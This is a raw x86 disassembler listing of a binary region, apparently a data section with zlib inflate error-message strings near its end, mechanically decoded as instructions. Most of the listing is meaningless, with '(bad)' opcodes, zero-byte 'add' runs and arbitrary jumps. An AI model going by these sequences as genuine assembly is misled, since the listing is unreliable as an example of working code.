   1e751:	or     ah,BYTE PTR [ecx+eiz*8-0x74b52d1f]
   1e758:	loope  0x1e719
   1e75a:	xchg   ecx,eax
   1e75b:	in     eax,0x4e
   1e75d:	add    BYTE PTR [edi],ah
   1e75f:	sti    
   1e760:	sahf   
   1e761:	xor    eax,0x0
   1e764:	mov    eax,0x650b9a66
   1e769:	in     eax,dx
   1e76a:	sub    BYTE PTR [edx],bh
   1e76c:	lock fild DWORD PTR [ebp+0x0]
   1e770:	imul   eax,DWORD PTR [eax],0xe
   1e773:	add    BYTE PTR [edi],dl
   1e775:	add    BYTE PTR [eax+eax*1],bl
   1e778:	or     eax,DWORD PTR [eax]
   1e77a:	or     DWORD PTR [eax],eax
   1e77c:	pop    edi
   1e77d:	add    BYTE PTR [ecx],al
   1e77f:	add    BYTE PTR [eax+eax*1],bl
   1e782:	dec    edx
   1e783:	add    BYTE PTR [eax],cl
   1e785:	add    BYTE PTR [eax],al
   1e787:	add    BYTE PTR [eax],al
   1e789:	add    BYTE PTR [ecx+ebx*4],al
   1e78c:	or     bh,cl
   1e78e:	push   esp
   1e78f:	in     al,0x12
   1e791:	xor    BYTE PTR [ebx+0x60],cl
   1e794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1e795:	jle    0x1e7d6
   1e797:	lock and al,0x43
   1e79a:	mov    WORD PTR [eax*4-0x1a3b51ad],es
   1e7a1:	mov    BYTE PTR ds:0x2b54b08b,al
   1e7a7:	mul    BYTE PTR [edx+ebx*2]
   1e7aa:	rcl    ch,1
   1e7ac:	cwde   
   1e7ad:	cmp    al,0x2d
   1e7af:	imul   ebx,DWORD PTR [eax+0x6a],0x19d15135
   1e7b6:	mov    ecx,DWORD PTR [ecx+edx*4]
   1e7b9:	ds xchg esp,eax
   1e7bb:	sbb    bh,dh
   1e7bd:	jge    0x1e83d
   1e7bf:	retf   
   1e7c0:	jne    0x1e799
   1e7c2:	fild   DWORD PTR [eax]
   1e7c4:	outs   dx,BYTE PTR ds:[esi]
   1e7c5:	sbb    dl,BYTE PTR [eax]
   1e7c7:	or     BYTE PTR [eax],al
   1e7c9:	inc    edx
   1e7ca:	dec    edx
   1e7cb:	or     BYTE PTR [eax],al
   1e7cd:	add    BYTE PTR [ebx+0x34c10bab],cl
   1e7d3:	or     al,0xb3
   1e7d5:	mov    ebp,DWORD PTR [eax]
   1e7d7:	sub    edx,DWORD PTR [ebp-0x1a60135d]
   1e7dd:	ret    
   1e7de:	jnp    0x1e7e1
   1e7e0:	dec    edx
   1e7e1:	(bad)  
   1e7e2:	fstp   TBYTE PTR [edi]
   1e7e4:	popa   
   1e7e5:	int3   
   1e7e6:	mov    edx,0x623c1bc4
   1e7eb:	and    eax,0xfe4157e5
   1e7f0:	adc    ebx,esi
   1e7f2:	das    
   1e7f3:	pushf  
   1e7f4:	jge    0x1e7e1
   1e7f6:	shl    DWORD PTR [eax-0x6e],cl
   1e7f9:	inc    ebp
   1e7fa:	cmp    cl,dl
   1e7fc:	add    ah,cl
   1e7fe:	pop    esp
   1e7ff:	add    BYTE PTR [edi],cl
   1e801:	add    BYTE PTR [edx],ch
   1e803:	add    BYTE PTR [edx],cl
   1e805:	add    BYTE PTR [edi],al
   1e807:	add    BYTE PTR [ecx],dl
   1e809:	add    BYTE PTR [eax],cl
   1e80b:	add    BYTE PTR [edi],bh
   1e80d:	add    BYTE PTR ds:0x1b000000,bh
   1e813:	add    BYTE PTR [eax],ch
   1e815:	add    BYTE PTR [edi],ch
   1e817:	add    BYTE PTR [edx],cl
   1e819:	add    BYTE PTR [edx],cl
   1e81b:	add    BYTE PTR [edi],al
   1e81d:	add    BYTE PTR [ecx],dl
   1e81f:	add    BYTE PTR [eax],cl
   1e821:	add    BYTE PTR [esi+0x0],bl
   1e824:	add    DWORD PTR [eax],eax
   1e826:	outs   dx,BYTE PTR ds:[esi]
   1e827:	add    BYTE PTR [eax],al
   1e829:	add    BYTE PTR [esi+0x9],ah
   1e82c:	xor    BYTE PTR [esi],dl
   1e82e:	sbb    al,0xc3
   1e830:	cmp    esi,eax
   1e832:	bound  ebp,QWORD PTR [eax+0x79733c84]
   1e838:	lea    eax,ds:0x8a99a1ec
   1e83e:	in     eax,0xc9
   1e840:	clc    
   1e841:	into   
   1e842:	clc    
   1e843:	fcmovb st,st(2)
   1e845:	inc    ebx
   1e846:	fisub  DWORD PTR [edi+ebp*8+0x1d]
   1e84a:	popf   
   1e84b:	push   esi
   1e84c:	dec    ecx
   1e84d:	inc    ebp
   1e84e:	popf   
   1e84f:	jo     0x1e898
   1e851:	dec    ebx
   1e852:	outs   dx,DWORD PTR ds:[esi]
   1e853:	dec    eax
   1e854:	xor    dh,cl
   1e856:	ins    BYTE PTR es:[edi],dx
   1e857:	out    0xfe,al
   1e859:	dec    ebp
   1e85a:	pop    ss
   1e85b:	add    bh,ch
   1e85d:	das    
   1e85e:	add    al,BYTE PTR [edx+0x7]
   1e861:	inc    ebp
   1e862:	imul   eax,DWORD PTR [eax],0xa9fc0094
   1e868:	cmp    BYTE PTR [edx+0x130a0675],cl
   1e86e:	xor    eax,0xf400f090
   1e873:	loop   0x1e841
   1e875:	test   eax,0x71d966de
   1e87b:	push   eax
   1e87c:	jg     0x1e8a9
   1e87e:	mov    ch,0xe6
   1e880:	lea    ecx,[ecx+ebp*1-0x3253110a]
   1e887:	inc    ecx
   1e888:	outs   dx,BYTE PTR ds:[esi]
   1e889:	call   DWORD PTR [ebx-0x64]
   1e88c:	sbb    BYTE PTR [edx+0x31],0x52
   1e890:	sbb    DWORD PTR [eax],eax
   1e892:	mov    ds:0xf08a8a45,eax
   1e897:	es pop es
   1e899:	jmp    edx
   1e89b:	arpl   cx,dx
   1e89d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1e89e:	xor    eax,0x9d0bf19c
   1e8a3:	js     0x1e8c8
   1e8a5:	lahf   
   1e8a6:	stc    
   1e8a7:	inc    ebx
   1e8a8:	cmp    BYTE PTR [ebp-0x1cc026f5],ah
   1e8ae:	push   ebx
   1e8af:	or     eax,0xf2870d7a
   1e8b4:	arpl   WORD PTR [edx+ebp*4+0x774487e0],sp
   1e8bb:	imul   ecx,DWORD PTR [ebx],0xf007ad6f
   1e8c1:	shl    BYTE PTR [eax-0x57],1
   1e8c4:	add    ah,cl
   1e8c6:	add    BYTE PTR cs:[ebp+0x0],bl
   1e8ca:	or     al,BYTE PTR [eax]
   1e8cc:	or     al,BYTE PTR [eax]
   1e8ce:	add    BYTE PTR [eax],al
   1e8d0:	and    BYTE PTR [ebx+0x7b723346],cl
   1e8d6:	les    ebp,FWORD PTR [esi]
   1e8d8:	into   
   1e8d9:	and    esp,edi
   1e8db:	js     0x1e92a
   1e8dd:	mov    ecx,0xf3d0cd44
   1e8e2:	fs inc ebx
   1e8e4:	gs jno 0x1e87e
   1e8e7:	sbb    al,0xa9
   1e8e9:	cmp    eax,0xf8034f4d
   1e8ee:	inc    eax
   1e8ef:	xchg   esi,eax
   1e8f0:	add    esp,eax
   1e8f2:	xchg   edx,eax
   1e8f3:	xchg   DWORD PTR [ebx-0x1d],eax
   1e8f6:	in     eax,0x93
   1e8f8:	retf   
   1e8f9:	stos   BYTE PTR es:[edi],al
   1e8fa:	mov    esp,0x4158cab7
   1e8ff:	mov    esp,0xa9cd79ba
   1e904:	mov    bl,0x59
   1e906:	into   
   1e907:	add    BYTE PTR [eax],cl
   1e909:	dec    esp
   1e90a:	jmp    0x2c0fa145
   1e90f:	jmp    0x51d6:0x7c53bcc3
   1e916:	xchg   esi,eax
   1e917:	leave  
   1e918:	test   eax,0xa8998de
   1e91d:	xor    BYTE PTR [eax],cl
   1e91f:	out    0x13,eax
   1e921:	loopne 0x1e98b
   1e923:	mov    al,ds:0x5416860d
   1e928:	out    dx,eax
   1e929:	sub    edx,edi
   1e92b:	cmp    BYTE PTR [ecx-0x7ae3f208],al
   1e931:	inc    eax
   1e932:	push   ss
   1e933:	lock fimul DWORD PTR [ecx]
   1e936:	sub    BYTE PTR [ecx+ebx*2+0x488243],bl
   1e93d:	int3   
   1e93e:	pop    esp
   1e93f:	add    BYTE PTR [edi],cl
   1e941:	add    BYTE PTR [edx],ch
   1e943:	add    BYTE PTR [edx],cl
   1e945:	add    BYTE PTR [edi],al
   1e947:	add    BYTE PTR [ecx],dl
   1e949:	add    BYTE PTR [eax],cl
   1e94b:	add    BYTE PTR [edi],bh
   1e94d:	add    BYTE PTR ds:0x1b000000,bh
   1e953:	add    BYTE PTR [eax],al
   1e955:	add    BYTE PTR [edx+0x15e1988c],dh
   1e95b:	in     al,dx
   1e95c:	icebp  
   1e95d:	repnz pop ss
   1e95f:	inc    edx
   1e960:	(bad)  
   1e961:	add    edi,ebp
   1e963:	pop    ecx
   1e964:	(bad)  
   1e965:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
   1e966:	push   ebx
   1e967:	xchg   ebp,eax
   1e968:	sbb    al,0xf
   1e96a:	std    
   1e96b:	mov    cl,0x41
   1e96d:	sub    bh,BYTE PTR [edx-0x27]
   1e970:	jns    0x1e9de
   1e972:	jnp    0x1e9cb
   1e974:	inc    esi
   1e975:	(bad)
   1e978:	mov    dh,0x77
   1e97a:	pop    edi
   1e97b:	jnp    0x1e9fc
   1e97d:	add    eax,0xb87fd614
   1e982:	cli    
   1e983:	mov    bl,0x59
   1e985:	xor    DWORD PTR [ebx+0x12d3f2],ebx
   1e98b:	int3   
   1e98c:	pop    esp
   1e98d:	add    BYTE PTR [esi],cl
   1e98f:	add    BYTE PTR [edi],dh
   1e991:	add    BYTE PTR [edx],al
   1e993:	add    BYTE PTR [esi],cl
   1e995:	add    BYTE PTR [edx],bl
   1e997:	add    BYTE PTR [edi],al
   1e999:	add    BYTE PTR [esi],al
   1e99b:	add    BYTE PTR [ebx],cl
   1e99d:	add    BYTE PTR ds:0x2c001100,ah
   1e9a3:	add    BYTE PTR [edx],al
   1e9a5:	add    BYTE PTR [ebx],cl
   1e9a7:	add    BYTE PTR [ecx],al
   1e9a9:	add    BYTE PTR [edi],al
   1e9ab:	add    BYTE PTR [ebx],cl
   1e9ad:	add    BYTE PTR [ecx],bh
   1e9af:	add    BYTE PTR [edi],cl
   1e9b1:	add    BYTE PTR [edx],cl
   1e9b3:	add    BYTE PTR [edx],cl
   1e9b5:	add    BYTE PTR [edi],al
   1e9b7:	add    BYTE PTR [ecx],dl
   1e9b9:	add    BYTE PTR [eax],cl
   1e9bb:	add    BYTE PTR [ecx],dl
   1e9bd:	add    BYTE PTR [edi],bl
   1e9bf:	add    BYTE PTR [esi],dh
   1e9c1:	add    BYTE PTR [edi],al
   1e9c3:	add    BYTE PTR [eax],al
   1e9c5:	add    BYTE PTR [edi],dl
   1e9c7:	add    BYTE PTR [ebx],cl
   1e9c9:	add    BYTE PTR [edx],bl
   1e9cb:	add    BYTE PTR [edi],dh
   1e9cd:	add    BYTE PTR [eax+eax*1],ch
   1e9d0:	add    DWORD PTR [eax],eax
   1e9d2:	sbb    al,BYTE PTR [eax]
   1e9d4:	push   es
   1e9d5:	add    BYTE PTR ds:0x3f000300,bl
   1e9db:	add    BYTE PTR [esi],dh
   1e9dd:	add    BYTE PTR [ecx],dl
   1e9df:	add    BYTE PTR [eax],ch
   1e9e1:	add    BYTE PTR [edi],cl
   1e9e3:	add    BYTE PTR [esi],dh
   1e9e5:	add    BYTE PTR [edi],dl
   1e9e7:	add    BYTE PTR [eax+eax*1],al
   1e9ea:	pop    ds
   1e9eb:	add    BYTE PTR [edx],cl
   1e9ed:	add    BYTE PTR [esi],al
   1e9ef:	add    BYTE PTR [esi],dl
   1e9f1:	add    BYTE PTR [edi],ch
   1e9f3:	add    BYTE PTR [eax],al
   1e9f5:	add    dl,al
   1e9f7:	and    ebp,ebx
   1e9f9:	cmp    eax,0x9cfd0f25
   1e9fe:	in     al,0xbf
   1ea00:	pop    edx
   1ea01:	inc    eax
   1ea02:	es cmc 
   1ea04:	add    eax,0xfc7a06aa
   1ea09:	aam    0xd8
   1ea0b:	(bad)  
   1ea0c:	xchg   edi,eax
   1ea0d:	neg    BYTE PTR [eax-0x5fcaf09d]
   1ea13:	pop    esi
   1ea14:	in     eax,dx
   1ea15:	pop    eax
   1ea16:	dec    ebx
   1ea17:	push   edx
   1ea18:	and    eax,0xb52149bd
   1ea1d:	call   0x6eb622
   1ea22:	pop    ds
   1ea23:	add    BYTE PTR [edx],dl
   1ea25:	add    BYTE PTR [edx],dl
   1ea27:	add    BYTE PTR [eax],al
   1ea29:	add    BYTE PTR [ebp+0x0],bl
   1ea2c:	dec    ebx
   1ea2d:	add    BYTE PTR ds:0x1d00,bl
   1ea33:	add    BYTE PTR [eax-0x7962d5b3],ch
   1ea39:	push   ebx
   1ea3a:	push   esi
   1ea3b:	dec    ebp
   1ea3c:	mov    dh,dl
   1ea3e:	fs jmp 0x1eab3
   1ea41:	fidivr DWORD PTR [ebx+0x5b]
   1ea44:	xchg   BYTE PTR [ecx-0x5a],cl
   1ea47:	sar    BYTE PTR [esi-0x79],cl
   1ea4a:	adc    eax,0xabd58f1
   1ea4f:	call   0x3a5a880
   1ea54:	inc    ebp
   1ea55:	mov    dl,0x3a
   1ea57:	mov    WORD PTR [ecx+0x57d30ca4],cs
   1ea5d:	call   0xf64f:0xa13791b0
   1ea64:	pushf  
   1ea65:	mov    dh,0x0
   1ea67:	int3   
   1ea68:	pop    edx
   1ea69:	sub    eax,0x6163725
   1ea6e:	sbb    BYTE PTR [eax],cl
   1ea70:	xor    DWORD PTR [edx+ebx*1],edi
   1ea73:	pop    ss
   1ea74:	add    al,0x5
   1ea76:	add    ah,cl
   1ea78:	iret   
   1ea79:	mov    ebp,0x6be41058
   1ea7e:	sahf   
   1ea7f:	add    DWORD PTR [edx],edx
   1ea81:	add    eax,0x71a75918
   1ea86:	cmc    
   1ea87:	pop    es
   1ea88:	mov    eax,ds:0x3bbc1bdc
   1ea8d:	out    0xee,eax
   1ea8f:	jb     0x1eaf9
   1ea91:	push   ecx
   1ea92:	cmp    esp,DWORD PTR [eax-0x41]
   1ea95:	jns    0x1eaf7
   1ea97:	shr    DWORD PTR [ecx],0x90
   1ea9a:	dec    edx
   1ea9b:	jmp    0xec8c:0x7a5037ac
   1eaa2:	sbb    bl,BYTE PTR [edi+0x17]
   1eaa5:	add    BYTE PTR [esi+0x3a],cl
   1eaa8:	and    esp,DWORD PTR ds:0x33111d1b
   1eaae:	aas    
   1eaaf:	sbb    eax,DWORD PTR [esi]
   1eab1:	add    DWORD PTR [ecx*1+0x2082821],edx
   1eab8:	sbb    eax,0x76cc000b
   1eabd:	xchg   edi,eax
   1eabe:	sbb    eax,0x4df419e0
   1eac3:	adc    al,0xf2
   1eac5:	cmc    
   1eac6:	mov    eax,0xca582d8e
   1eacb:	push   esp
   1eacc:	out    0x25,eax
   1eace:	pop    es
   1eacf:	je     0x1eaed
   1ead1:	call   0x3585:0x68fa11ca
   1ead8:	ss jno 0x1eb56
   1eadb:	iret   
   1eadc:	mov    dh,0x28
   1eade:	xchg   ebp,eax
   1eadf:	sahf   
   1eae0:	push   0xffffffe2
   1eae2:	lahf   
   1eae3:	sti    
   1eae4:	inc    ecx
   1eae5:	or     al,0xbf
   1eae7:	jb     0x1ead2
   1eae9:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
   1eaeb:	sub    eax,0x2d5a0072
   1eaf0:	daa    
   1eaf1:	and    bl,BYTE PTR ds:0x1706111b
   1eaf7:	and    bh,BYTE PTR [edi]
   1eaf9:	sbb    eax,DWORD PTR [esi]
   1eafb:	add    DWORD PTR [ecx*1+0x2082821],edx
   1eb02:	sbb    eax,0x6acc000b
   1eb07:	imul   edi,DWORD PTR [ebx+0x1e7a49ce],0xfffffff9
   1eb0e:	dec    ecx
   1eb0f:	mov    ch,0x5d
   1eb11:	mov    al,0xd5
   1eb13:	sbb    dh,BYTE PTR [esp+eiz*4]
   1eb16:	mov    ah,0xe4
   1eb18:	loope  0x1eac2
   1eb1a:	mov    DWORD PTR [eax+0xf],eax
   1eb1d:	xor    ah,bl
   1eb1f:	lods   al,BYTE PTR ds:[esi]
   1eb20:	loope  0x1eba0
   1eb22:	mov    esi,?
   1eb24:	je     0x1eb3d
   1eb26:	leave  
   1eb27:	add    BYTE PTR [edi-0x3cf308e8],cl
   1eb2d:	mov    cl,0xc3
   1eb2f:	sub    eax,0x6b9d6b95
   1eb34:	das    
   1eb35:	aam    0xf7
   1eb37:	push   ss
   1eb38:	mov    ebp,0xe7626ee3
   1eb3d:	adc    bl,BYTE PTR cs:[ebp-0x1a5c69a9]
   1eb44:	push   ss
   1eb45:	inc    ecx
   1eb46:	ins    BYTE PTR es:[edi],dx
   1eb47:	mov    ds:0x330a9c9b,al
   1eb4c:	mov    dh,0x76
   1eb4e:	and    DWORD PTR [esi+0x6ee26d79],edi
   1eb54:	push   ebx
   1eb55:	xor    ebx,esi
   1eb57:	sub    eax,DWORD PTR [edx]
   1eb59:	sub    ch,ah
   1eb5b:	xchg   edx,eax
   1eb5c:	jbe    0x1eb68
   1eb5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
   1eb5f:	loopne 0x1eb3a
   1eb61:	stos   DWORD PTR es:[edi],eax
   1eb62:	add    ah,cl
   1eb64:	pop    esp
   1eb65:	add    BYTE PTR [eax],bl
   1eb67:	add    BYTE PTR [ebx],ch
   1eb69:	add    BYTE PTR [eax+eax*1],bl
   1eb6c:	aaa    
   1eb6d:	add    BYTE PTR [ecx],ah
   1eb6f:	add    BYTE PTR [ebx],dl
   1eb71:	add    BYTE PTR [edi],bl
   1eb73:	add    BYTE PTR [edx],cl
   1eb75:	add    BYTE PTR [esi],al
   1eb77:	add    BYTE PTR [esi],dl
   1eb79:	add    BYTE PTR [edi],ch
   1eb7b:	add    BYTE PTR [ecx+0x0],bh
   1eb7e:	push   esi
   1eb7f:	add    BYTE PTR [eax],al
   1eb81:	add    BYTE PTR [ecx+0x3fbafce4],bl
   1eb87:	mov    cl,0x24
   1eb89:	xchg   dh,ch
   1eb8b:	dec    ebx
   1eb8c:	and    eax,0xe52cc2ab
   1eb91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
   1eb92:	push   cs
   1eb93:	leave  
   1eb94:	outs   dx,BYTE PTR ds:[esi]
   1eb95:	push   es
   1eb96:	jb     0x1eba9
   1eb98:	mov    ebx,0x1bb8bd65
   1eb9d:	mov    al,0x1
   1eb9f:	into   
   1eba0:	mov    ss,WORD PTR [eax+0x4e]
   1eba3:	xchg   ebp,eax
   1eba4:	mov    bl,0x2e
   1eba6:	jp     0x1eb31
   1eba8:	dec    ecx
   1eba9:	cwde   
   1ebaa:	push   cs
   1ebab:	and    al,0x8c
   1ebad:	mov    esp,0x968ac5f1
   1ebb2:	mov    dh,0x8f
   1ebb4:	mov    ah,BYTE PTR [esi-0x2e]
   1ebb7:	aad    0x42
   1ebb9:	add    BYTE PTR [eax+eax*1+0x18],bl
   1ebbd:	add    BYTE PTR [ecx],ah
   1ebbf:	add    BYTE PTR [ebx],dl
   1ebc1:	add    BYTE PTR [edi],bl
   1ebc3:	add    BYTE PTR [edx],cl
   1ebc5:	add    BYTE PTR [esi],al
   1ebc7:	add    BYTE PTR [ecx],bh
   1ebc9:	add    BYTE PTR [ecx+0x0],bh
   1ebcc:	push   esi
   1ebcd:	add    BYTE PTR [eax],al
   1ebcf:	add    BYTE PTR ds:0x81f21d82,al
   1ebd5:	je     0x1ec4c
   1ebd7:	outs   dx,BYTE PTR ds:[esi]
   1ebd8:	out    dx,eax
   1ebd9:	lea    ebx,[edi+0x67]
   1ebdc:	pop    ebx
   1ebdd:	lods   al,BYTE PTR ds:[esi]
   1ebde:	scas   al,BYTE PTR es:[edi]
   1ebdf:	aaa    
   1ebe0:	lea    edx,[ebp+0x3edecc8d]
   1ebe6:	sbb    edi,DWORD PTR ds:0xae6b5689
   1ebec:	aad    0x4
   1ebee:	loop   0x1ec47
   1ebf0:	mov    esi,0x7c1736f
   1ebf5:	and    eax,0x418f1f58
   1ebfa:	push   ebp
   1ebfb:	cdq    
   1ebfc:	sbb    BYTE PTR [edi],0x7
   1ebff:	inc    ebx
   1ec00:	xchg   edi,eax
   1ec01:	bound  ebp,QWORD PTR [ebp+0x462fbd2f]
   1ec07:	mov    edx,0x520de00c
   1ec0c:	add    ah,cl
   1ec0e:	push   ebx
   1ec0f:	add    BYTE PTR [ecx+0x0],bh
   1ec12:	jae    0x1ec14
   1ec14:	inc    ebp
   1ec15:	add    BYTE PTR [esi+0x0],dh
   1ec18:	je     0x1ec1a
   1ec1a:	inc    ebx
   1ec1b:	add    BYTE PTR [eax],al
   1ec1d:	add    BYTE PTR [eax+eax*1+0x0],bl
   1ec21:	add    BYTE PTR [edx+0x0],dh
   1ec24:	jb     0x1ec26
   1ec26:	add    BYTE PTR [eax],al
   1ec28:	pop    ebp
   1ec29:	in     al,0xb0
   1ec2b:	daa    
   1ec2c:	scas   al,BYTE PTR es:[edi]
   1ec2d:	mov    dl,0x85
   1ec2f:	test   ebx,esp
   1ec31:	rcr    DWORD PTR [eax],0x2c
   1ec34:	jmp    0x9b5a:0x86064f6e
   1ec3b:	pop    es
   1ec3c:	cmp    eax,0xf1875b01
   1ec41:	jle    0x1ebf2
   1ec43:	repnz loope 0x1ec37
   1ec46:	or     BYTE PTR [ebx],0xc5
   1ec49:	test   al,0xc3
   1ec4b:	fxch   st(1)
   1ec4d:	stos   DWORD PTR es:[edi],eax
   1ec4e:	xor    edi,DWORD PTR [edx+0x136e0a68]
   1ec54:	add    ah,cl
   1ec56:	and    eax,0x5ccc0053
   1ec5b:	add    BYTE PTR [ebx+0x0],dh
   1ec5e:	jns    0x1ec60
   1ec60:	jae    0x1ec62
   1ec62:	je     0x1ec64
   1ec64:	add    BYTE PTR gs:[ebp+0x0],ch
   1ec68:	jb     0x1ec6a
   1ec6a:	outs   dx,DWORD PTR ds:[esi]
   1ec6b:	add    BYTE PTR [edi+0x0],ch
   1ec6e:	je     0x1ec70
   1ec70:	pop    esp
   1ec71:	add    BYTE PTR [ebx+0x0],dh
   1ec74:	jns    0x1ec76
   1ec76:	jae    0x1ec78
   1ec78:	je     0x1ec7a
   1ec7a:	add    BYTE PTR gs:[ebp+0x0],ch
   1ec7e:	xor    eax,DWORD PTR [eax]
   1ec80:	xor    al,BYTE PTR [eax]
   1ec82:	pop    esp
   1ec83:	add    BYTE PTR ds:0x5300,ah
   1ec89:	add    BYTE PTR [ecx],dh
   1ec8b:	xor    ch,BYTE PTR cs:[esi]
   1ec8e:	xor    eax,DWORD PTR [eax]
   1ec90:	imul   ebp,DWORD PTR [esi+0x63],0x6572726f
   1ec97:	arpl   WORD PTR [eax+eiz*1+0x6c],si
   1ec9b:	outs   dx,BYTE PTR gs:[esi]
   1ec9d:	addr16 je 0x1ed08
   1eca0:	and    BYTE PTR [ebx+0x68],ah
   1eca3:	arpl   WORD PTR gs:[ebx+0x0],bp
   1eca7:	int3   
   1eca8:	imul   ebp,DWORD PTR [esi+0x63],0x6572726f
   1ecaf:	arpl   WORD PTR [eax+eiz*1+0x64],si
   1ecb3:	popa   
   1ecb4:	je     0x1ed17
   1ecb6:	and    BYTE PTR [ebx+0x68],ah
   1ecb9:	arpl   WORD PTR gs:[ebx+0x0],bp
   1ecbd:	int3   
   1ecbe:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ecc5:	and    BYTE PTR [ecx+ebp*2+0x73],ah
   1ecc9:	je     0x1ed2c
   1eccb:	outs   dx,BYTE PTR ds:[esi]
   1eccc:	arpl   WORD PTR [ebp+0x20],sp
   1eccf:	je     0x1ed40
   1ecd1:	outs   dx,DWORD PTR ds:[esi]
   1ecd2:	and    BYTE PTR [esi+0x61],ah
   1ecd5:	jb     0x1ecf7
   1ecd7:	bound  esp,QWORD PTR [ecx+0x63]
   1ecda:	imul   eax,DWORD PTR [eax],0x69
   1ecdd:	outs   dx,BYTE PTR ds:[esi]
   1ecde:	jbe    0x1ed41
   1ece0:	ins    BYTE PTR es:[edi],dx
   1ece1:	imul   esp,DWORD PTR [eax+eiz*1+0x64],0x61747369
   1ece9:	outs   dx,BYTE PTR ds:[esi]
   1ecea:	arpl   WORD PTR [ebp+0x20],sp
   1eced:	arpl   WORD PTR [edi+0x64],bp
   1ecf0:	add    BYTE PTR gs:[ecx+0x6e],ch
   1ecf4:	jbe    0x1ed57
   1ecf6:	ins    BYTE PTR es:[edi],dx
   1ecf7:	imul   esp,DWORD PTR [eax+eiz*1+0x6c],0x72657469
   1ecff:	popa   
   1ed00:	ins    BYTE PTR es:[edi],dx
   1ed01:	das    
   1ed02:	ins    BYTE PTR es:[edi],dx
   1ed03:	outs   dx,BYTE PTR gs:[esi]
   1ed05:	addr16 je 0x1ed70
   1ed08:	and    BYTE PTR [ebx+0x6f],ah
   1ed0b:	fs add BYTE PTR gs:[ecx+0x6e],ch
   1ed10:	jbe    0x1ed73
   1ed12:	ins    BYTE PTR es:[edi],dx
   1ed13:	imul   esp,DWORD PTR [eax+eiz*1+0x64],0x61747369
   1ed1b:	outs   dx,BYTE PTR ds:[esi]
   1ed1c:	arpl   WORD PTR [ebp+0x73],sp
   1ed1f:	and    BYTE PTR [ebx+0x65],dh
   1ed22:	je     0x1ed24
   1ed24:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ed2b:	and    BYTE PTR [ecx+ebp*2+0x74],ch
   1ed2f:	gs jb  0x1ed93
   1ed32:	ins    BYTE PTR es:[edi],dx
   1ed33:	das    
   1ed34:	ins    BYTE PTR es:[edi],dx
   1ed35:	outs   dx,BYTE PTR gs:[esi]
   1ed37:	addr16 je 0x1eda2
   1ed3a:	jae    0x1ed5c
   1ed3c:	jae    0x1eda3
   1ed3e:	je     0x1ed40
   1ed40:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ed47:	and    BYTE PTR [edx+0x69],ah
   1ed4a:	je     0x1ed6c
   1ed4c:	ins    BYTE PTR es:[edi],dx
   1ed4d:	outs   dx,BYTE PTR gs:[esi]
   1ed4f:	addr16 je 0x1edba
   1ed52:	and    BYTE PTR [edx+0x65],dh
   1ed55:	jo     0x1edbc
   1ed57:	popa   
   1ed58:	je     0x1ed5a
   1ed5a:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ed61:	and    BYTE PTR [ebx+0x6f],ah
   1ed64:	fs and BYTE PTR gs:[ebp+eiz*2+0x6e],ch
   1ed6a:	addr16 je 0x1edd5
   1ed6d:	jae    0x1ed8f
   1ed6f:	jae    0x1edd6
   1ed71:	je     0x1ed73
   1ed73:	int3   
   1ed74:	je     0x1ede5
   1ed76:	outs   dx,DWORD PTR ds:[esi]
   1ed77:	and    BYTE PTR [ebp+0x61],ch
   1ed7a:	outs   dx,BYTE PTR ds:[esi]
   1ed7b:	jns    0x1ed9d
   1ed7d:	ins    BYTE PTR es:[edi],dx
   1ed7e:	outs   dx,BYTE PTR gs:[esi]
   1ed80:	addr16 je 0x1edeb
   1ed83:	and    BYTE PTR [edi+0x72],ch
   1ed86:	and    BYTE PTR [ecx+ebp*2+0x73],ah
   1ed8a:	je     0x1eded
   1ed8c:	outs   dx,BYTE PTR ds:[esi]
   1ed8d:	arpl   WORD PTR [ebp+0x20],sp
   1ed90:	jae    0x1ee0b
   1ed92:	ins    DWORD PTR es:[edi],dx
   1ed93:	bound  ebp,QWORD PTR [edi+0x6c]
   1ed96:	jae    0x1ed98
   1ed98:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ed9f:	and    BYTE PTR [ebx+0x74],dh
   1eda2:	outs   dx,DWORD PTR ds:[esi]
   1eda3:	jb     0x1ee0a
   1eda5:	and    BYTE PTR fs:[edx+0x6c],ah
   1eda9:	outs   dx,DWORD PTR ds:[esi]
   1edaa:	arpl   WORD PTR [ebx+0x20],bp
   1edad:	ins    BYTE PTR es:[edi],dx
   1edae:	outs   dx,BYTE PTR gs:[esi]
   1edb0:	addr16 je 0x1ee1b
   1edb3:	jae    0x1edb5
   1edb5:	int3   
   1edb6:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1edbd:	and    BYTE PTR [edx+0x6c],ah
   1edc0:	outs   dx,DWORD PTR ds:[esi]
   1edc1:	arpl   WORD PTR [ebx+0x20],bp
   1edc4:	je     0x1ee3f
   1edc6:	jo     0x1ee2d
   1edc8:	add    ah,cl
   1edca:	push   0x65646165
   1edcf:	jb     0x1edf1
   1edd1:	arpl   WORD PTR [edx+0x63],si
   1edd4:	and    BYTE PTR [ebp+0x69],ch
   1edd7:	jae    0x1ee46
   1edd9:	popa   
   1edda:	je     0x1ee3f
   1eddc:	push   0x6b6e7500
   1ede1:	outs   dx,BYTE PTR ds:[esi]
   1ede2:	outs   dx,DWORD PTR ds:[esi]
   1ede3:	ja     0x1ee53
   1ede5:	and    BYTE PTR [eax+0x65],ch
   1ede8:	popa   
   1ede9:	fs gs jb 0x1ee0d
   1eded:	data16 ins BYTE PTR es:[edi],dx
   1edef:	popa   
   1edf0:	addr16 jae 0x1ee13
   1edf3:	jae    0x1ee5a
   1edf5:	je     0x1edf7
   1edf7:	int3   
   1edf8:	imul   ebp,DWORD PTR [esi+0x63],0x6572726f
   1edff:	arpl   WORD PTR [eax+eiz*1+0x68],si
   1ee03:	gs popa 
   1ee05:	fs gs jb 0x1ee29
   1ee09:	arpl   WORD PTR [eax+0x65],bp
   1ee0c:	arpl   WORD PTR [ebx+0x0],bp
   1ee0f:	int3   
   1ee10:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ee17:	and    BYTE PTR [edi+0x69],dh
   1ee1a:	outs   dx,BYTE PTR ds:[esi]
